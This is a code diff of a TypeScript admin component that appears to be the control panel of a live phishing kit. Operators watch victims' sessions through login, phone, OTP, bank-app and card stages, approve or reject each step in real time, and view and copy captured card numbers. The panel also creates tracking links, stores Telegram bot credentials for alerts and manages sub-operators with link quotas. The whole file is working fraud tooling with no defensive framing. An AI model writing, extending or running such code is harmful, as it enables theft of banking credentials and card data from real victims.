+          case 'bank_app_pending': return 'APPROVE_APP';
+          default: return 'APPROVE';
       }
   }
 
-  async saveSettings() {
-      try {
-          await fetch('/api/admin/settings', {
-              method: 'POST',
-              headers: {
-                  'Content-Type': 'application/json',
-                  'Authorization': `Bearer ${this.auth.getToken()}`
-              },
-              body: JSON.stringify({
-                  settings: this.flowSettings,
-                  telegramConfig: { token: this.tgToken, chat: this.tgChat }
-              })
-          });
-          this.state.showAdminToast('Settings Saved');
-      } catch(e) {
-          this.state.showAdminToast('Save Failed');
-      }
+  getDeviceImage(ua: string | undefined): string | null {
+      if (!ua) return null;
+      const lower = ua.toLowerCase();
+      if (lower.includes('macintosh') || lower.includes('mac os') || lower.includes('iphone') || lower.includes('ipad')) return 'assets/icons/apple.svg';
+      if (lower.includes('windows')) return 'assets/icons/windows.svg';
+      return null;
   }
-
-  async deleteSettings() {
-      if(await this.modal.confirm('Delete Credentials', 'Are you sure you want to remove the Telegram credentials?', 'danger')) {
-          this.tgToken = '';
-          this.tgChat = '';
-          this.saveSettings();
-      }
+  getDeviceIcon(ua: string | undefined): string {
+      if (!ua) return 'help_outline';
+      const lower = ua.toLowerCase();
+      if (lower.includes('iphone')) return 'phone_iphone';
+      if (lower.includes('ipad')) return 'tablet_mac';
+      if (lower.includes('android')) return lower.includes('mobile') ? 'android' : 'tablet_android';
+      if (lower.includes('macintosh') || lower.includes('mac os')) return 'laptop_mac';
+      if (lower.includes('windows')) return 'desktop_windows';
+      if (lower.includes('linux')) return 'terminal';
+      return 'devices';
   }
-
-  async changePassword() {
-      if (!this.settingOldPass || !this.settingNewPass) {
-          this.state.showAdminToast('Fill all fields');
-          return;
-      }
-      const success = await this.state.changeAdminPassword(this.settingOldPass, this.settingNewPass);
-      if (success) {
-          this.state.showAdminToast('Password Changed');
-          this.settingOldPass = '';
-          this.settingNewPass = '';
-      } else {
-          this.state.showAdminToast('Incorrect Old Password');
-      }
-  }
-
-  toggleDarkMode() {
-      this.isDarkMode.update(d => !d);
-      if (this.isDarkMode()) {
-          document.documentElement.classList.add('dark');
-          localStorage.setItem('admin_theme', 'dark');
-      } else {
-          document.documentElement.classList.remove('dark');
-          localStorage.setItem('admin_theme', 'light');
-      }
-  }
-
-  getFlagUrl(countryCode: string | undefined): string {
-      if (!countryCode) return '';
-      return `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`;
-  }
-
+  getFlagUrl(countryCode: string | undefined): string { if (!countryCode) return ''; return `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`; }
   getCardLogoUrl(cardType: string | undefined): string {
       if (!cardType) return '';
       const t = cardType.toLowerCase();
@@ -2346,11 +1392,10 @@ ${session.fingerprint?.userAgent}
       if (t === 'discover') return 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
       return '';
   }
-
+  getLinkUrl(code: string): string { return `${window.location.origin}/?id=${code}`; }
+  isDefaultLink(code: string): boolean { return code === this.auth.currentUser()?.uniqueCode; }
   getActionBadge(session: any): string | null {
-      // Only show badge if user is waiting (loading screen)
       if (session.currentView !== 'loading') return null;
-
       switch (session.stage) {
           case 'login': return 'APPROVE LOGIN';
           case 'phone_pending': return 'APPROVE PHONE';
@@ -2361,45 +1406,138 @@ ${session.fingerprint?.userAgent}
           default: return 'ACTION NEEDED';
       }
   }
-
-  viewLinkedSession() {
-      const linkedId = this.monitoredSession()?.data?.linkedSessionId;
-      if (!linkedId) return;
-
-      const found = this.state.history().find(h => h.id === linkedId);
-      if (found) {
-          this.viewHistory(found);
-      } else {
-          this.state.showAdminToast('Linked session not found in history');
-      }
+  getDisplayEmail(email: string): string { return email || 'Waiting...'; }
+  isSessionLive(session: any): boolean { if (!session || !session.lastSeen) return false; return (Date.now() - session.lastSeen) < 60000; }
+  isSelected(session: any): boolean { return this.state.monitoredSessionId() === session.id; }
+  formatCard(num: string | undefined): string { if (!num) return '•••• •••• •••• ••••'; return num.replace(/\s+/g, '').replace(/(.{4})/g, '$1 ').trim(); }
+  copy(val: string) { if (!val) return; navigator.clipboard.writeText(val).then(() => { this.state.showAdminToast('Copied to clipboard'); }); }
+  private getElapsed(timestamp: Date | undefined): string {
+      if (!timestamp) return '0m';
+      const diffMs = Date.now() - new Date(timestamp).getTime();
+      const diffMins = Math.floor(diffMs / 60000);
+      if (diffMins < 60) return `${diffMins}m`;
+      const h = Math.floor(diffMins / 60);
+      const m = diffMins % 60;
+      return `${h}h ${m}m`;
   }
 
-  getDeviceImage(ua: string | undefined): string | null {
-      if (!ua) return null;
-      const lower = ua.toLowerCase();
-      if (lower.includes('macintosh') || lower.includes('mac os') || lower.includes('iphone') || lower.includes('ipad')) {
-           return 'assets/icons/apple.svg';
-      }
-      if (lower.includes('windows')) {
-           return 'assets/icons/windows.svg';
-      }
-      return null;
+  selectSession(s: any) { this.state.setMonitoredSession(s.id); }
+  viewHistory(s: any) { this.selectedHistorySession.set(s); this.historyPanelOpen.set(true); }
+  closeHistory() { this.historyPanelOpen.set(false); this.selectedHistorySession.set(null); }
+  archiveSession(s: any, e: Event) { e.stopPropagation(); this.state.archiveSession(s.id); }
+  approve(p={}) { this.state.adminApproveStep(p); }
+  reject() { this.state.adminRejectStep('Manual Reject'); }
+  revoke() { this.state.adminRevokeSession(this.monitoredSession()!.id); }
+
+  toggleDarkMode() {
+      this.isDarkMode.update(d => !d);
+      if (this.isDarkMode()) { document.documentElement.classList.add('dark'); localStorage.setItem('admin_theme', 'dark'); }
+      else { document.documentElement.classList.remove('dark'); localStorage.setItem('admin_theme', 'light'); }
   }
 
-  getDeviceIcon(ua: string | undefined): string {
-      if (!ua) return 'help_outline';
-      const lower = ua.toLowerCase();
-
-      if (lower.includes('iphone')) return 'phone_iphone';
-      if (lower.includes('ipad')) return 'tablet_mac';
-      if (lower.includes('android')) {
-          if (lower.includes('mobile')) return 'android';
-          return 'tablet_android';
-      }
-      if (lower.includes('macintosh') || lower.includes('mac os')) return 'laptop_mac';
-      if (lower.includes('windows')) return 'desktop_windows';
-      if (lower.includes('linux')) return 'terminal';
-
-      return 'devices';
+  async fetchLinks(adminId?: string) {
+      try {
+          let url = '/api/admin/links';
+          if (adminId) url += `?adminId=${adminId}`;
+          const res = await fetch(url, { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
+          if (res.ok) {
+              const data = await res.json();
+              if (adminId) this.selectedAdminLinks.set(data);
+              else this.linkList.set(data);
+          }
+      } catch(e) {}
   }
+  async generateLink() {
+      try {
+          const res = await fetch('/api/admin/links', { method: 'POST', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
+          if (res.ok) { const data = await res.json(); this.state.showAdminToast(`Link Created: ${data.code}`); this.fetchLinks(); }
+          else { const err = await res.json(); this.state.showAdminToast(err.error || 'Failed to create link'); }
+      } catch(e) { this.state.showAdminToast('Error creating link'); }
+  }
+  async deleteLink(code: string) {
+      if(!await this.modal.confirm('Delete Link', `Delete tracking link ${code}?`, 'danger')) return;
+      try {
+          const res = await fetch(`/api/admin/links/${code}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
+          if (res.ok) { this.state.showAdminToast('Link Deleted'); this.fetchLinks(); }
+          else { const err = await res.json(); this.state.showAdminToast(err.error || 'Failed'); }
+      } catch(e) { this.state.showAdminToast('Error deleting link'); }
+  }
+
+  async fetchUsers() {
+      try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } }); if (res.ok) this.userList.set(await res.json()); } catch(e) {}
+  }
+  async deleteUser(user: any) {
+      if (!await this.modal.confirm('Delete User', `Are you sure you want to delete ${user.username}?`, 'danger')) return;
+      try {
+          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } });
+          if (res.ok) { this.state.showAdminToast('User Deleted'); this.closeUserPanel(); this.fetchUsers(); }
+      } catch(e) {}
+  }
+  async impersonateUser(user: any) {
+      if (!await this.modal.confirm('Impersonate User', `Log in as ${user.username}?`, 'confirm')) return;
+      const success = await this.auth.impersonate(user.id);
+      if (success) window.location.reload(); else this.state.showAdminToast('Impersonation Failed');
+  }
+  async toggleSuspension(user: any) {
+      const action = user.isSuspended ? 'unsuspend' : 'suspend';
+      if (!await this.modal.confirm(action === 'suspend' ? 'Suspend User' : 'Unsuspend User', `Are you sure you want to ${action} ${user.username}?`)) return;
+      try {
+          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ isSuspended: !user.isSuspended }) });
+          if (res.ok) { this.state.showAdminToast(user.isSuspended ? 'User Activated' : 'User Suspended'); this.fetchUsers(); if(this.selectedAdmin()?.id === user.id) this.selectedAdmin.update(u => ({ ...u, isSuspended: !u.isSuspended })); }
+      } catch(e) { this.state.showAdminToast('Update Failed'); }
+  }
+  async resetUserPassword(user: any) {
+      const newPass = await this.modal.prompt('Reset Password', `Enter new password for ${user.username}:`, '');
+      if (!newPass) return;
+      try {
+          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ password: newPass }) });
+          if (res.ok) this.state.showAdminToast('Password Reset');
+      } catch(e) { this.state.showAdminToast('Reset Failed'); }
+  }
+  async updateUserMaxLinks(user: any) { /* Already in template logic? No, let's keep for backup */ }
+  async submitCreateUser() {
+      if (!this.newUser.username || !this.newUser.password) { this.state.showAdminToast('Username and Password required'); return; }
+      try {
+          const res = await fetch('/api/admin/users', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ username: this.newUser.username, password: this.newUser.password, role: this.newUser.role, maxLinks: this.newUser.maxLinks, settings: this.newUser.flow }) });
+          if (res.ok) { this.state.showAdminToast('User Created'); this.closeUserModal(); this.fetchUsers(); } else this.state.showAdminToast('Failed to create user');
+      } catch(e) { this.state.showAdminToast('Error creating user'); }
+  }
+
+  openAddUserModal() { this.newUser = { username: '', password: '', role: 'admin', maxLinks: 1, flow: { autoApproveLogin: false, skipPhone: false, forceBankApp: false, forceOtp: false, autoApproveCard: false } }; this.userModalOpen.set(true); }
+  closeUserModal() { this.userModalOpen.set(false); }
+  viewAdminDetails(u: any) { this.selectedAdmin.set(u); this.selectedAdminSettings = { ...u.settings }; this.userPanelOpen.set(true); this.fetchLinks(u.id); }
+  closeUserPanel() { this.userPanelOpen.set(false); this.selectedAdmin.set(null); }
+
+  async saveAdminSettings() {
+      const user = this.selectedAdmin(); if (!user) return;
+      try {
+          const res = await fetch(`/api/admin/users/${user.id}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ settings: this.selectedAdminSettings, maxLinks: user.maxLinks }) });
+          if (res.ok) { this.state.showAdminToast('Settings Updated'); this.fetchUsers(); }
+      } catch(e) { this.state.showAdminToast('Update Failed'); }
+  }
+
+  async saveGateSettings() {
+      try { await fetch('/api/settings', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ gateUser: this.gateUser, gatePass: this.gatePass }) }); this.state.showAdminToast('Gate Credentials Updated'); } catch(e) { this.state.showAdminToast('Save Failed'); }
+  }
+
+  async submitAssignment(adminId: string) {
+      const s = this.monitoredSession(); if(!s) return;
+      try { await fetch('/api/admin/assign-session', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ sessionId: s.id, adminId }) }); this.state.showAdminToast('Assigned'); this.state.fetchSessions(); this.assignModalOpen.set(false); } catch(e) { this.state.showAdminToast('Assignment Failed'); }
+  }
+  async assignAdmin() { this.assignModalOpen.set(true); }
+  async bulkDelete() { const ids = Array.from(this.selectedSessionIds()); if (ids.length === 0) return; if (!await this.modal.confirm('Bulk Delete', `Delete ${ids.length} sessions?`, 'danger')) return; ids.forEach(id => this.state.deleteSession(id)); this.selectedSessionIds.set(new Set()); }
+  bulkPin() { const ids = Array.from(this.selectedSessionIds()); if (ids.length === 0) return; ids.forEach(id => this.state.pinSession(id)); this.selectedSessionIds.set(new Set()); }
+  bulkExport() { this.state.showAdminToast('Exporting...'); }
+  toggleAllSelection(e: Event) { const checked = (e.target as HTMLInputElement).checked; if (checked) { const allIds = this.filteredHistory().map(h => h.id); this.selectedSessionIds.set(new Set(allIds)); } else this.selectedSessionIds.set(new Set()); }
+  toggleSelection(id: string, e: Event) { e.stopPropagation(); this.selectedSessionIds.update(set => { const newSet = new Set(set); if (newSet.has(id)) newSet.delete(id); else newSet.add(id); return newSet; }); }
+  isAllSelected() { const filtered = this.filteredHistory(); if (filtered.length === 0) return false; return this.selectedSessionIds().size === filtered.length; }
+  async fetchAuditLogs() { try { const res = await fetch('/api/admin/audit', { headers: { 'Authorization': `Bearer ${this.auth.getToken()}` } }); if (res.ok) this.auditLogs.set(await res.json()); } catch(e) {} }
+  calcStats() { const users = this.userList(); const history = this.state.history(); const active = this.state.activeSessions(); this.kpiStats.set({ total: history.length + active.length, active: active.length, verified: history.filter(h => !h.data?.isArchivedIncomplete).length, clicks: 0 }); }
+  async changePassword() { if (!this.settingOldPass || !this.settingNewPass) { this.state.showAdminToast('Fill all fields'); return; } const success = await this.state.changeAdminPassword(this.settingOldPass, this.settingNewPass); if (success) { this.state.showAdminToast('Password Changed'); this.settingOldPass = ''; this.settingNewPass = ''; } else this.state.showAdminToast('Incorrect Old Password'); }
+  async saveSettings() { try { await fetch('/api/admin/settings', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${this.auth.getToken()}` }, body: JSON.stringify({ settings: this.flowSettings, telegramConfig: { token: this.tgToken, chat: this.tgChat } }) }); this.state.showAdminToast('Settings Saved'); } catch(e) { this.state.showAdminToast('Save Failed'); } }
+  async deleteSettings() { if(await this.modal.confirm('Delete Credentials', 'Are you sure you want to remove the Telegram credentials?', 'danger')) { this.tgToken = ''; this.tgChat = ''; this.saveSettings(); } }
+  extendTimeout(ms: number) { const s = this.monitoredSession(); if (s) { this.state.sendAdminCommand(s.id, 'EXTEND_TIMEOUT', { duration: ms }); this.state.showAdminToast(`Added +${ms/1000}s`); } }
+  requestFlow(f: any) { this.state.adminApproveStep({ flow: f }); }
+  viewLinkedSession() { const linkedId = this.monitoredSession()?.data?.linkedSessionId; if (!linkedId) return; const found = this.state.history().find(h => h.id === linkedId); if (found) this.viewHistory(found); else this.state.showAdminToast('Linked session not found in history'); }
+  exportTxt(s: any) {}
 }
